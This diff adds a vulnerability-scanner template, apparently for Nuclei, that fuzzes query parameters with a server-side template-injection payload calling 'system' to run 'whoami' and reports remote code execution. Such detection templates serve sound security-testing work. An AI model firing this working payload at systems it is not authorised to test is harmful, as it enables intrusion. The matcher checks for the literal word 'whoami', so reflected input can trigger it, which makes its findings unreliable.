@@ -1,0 +1,40 @@
+id: fuzz-rce-template
+
+info:
+  name: Remote Code Execution (RCE) Detection
+  author: netbaan
+  severity: critical  # RCE is typically considered a critical vulnerability
+  description: |
+    This template is designed to detect Remote Code Execution (RCE) vulnerabilities 
+    using a template engine exploitation payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      rce:
+        - "{{var this.getTemplateFilter().addAfterFilterCallback(\"system\").filter(\"whoami\")}}"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "whoami"  # Expecting the command output in the response body
+
+      - type: word
+        part: header
+        words:
+          - "text/html"  # Ensure the response is in HTML
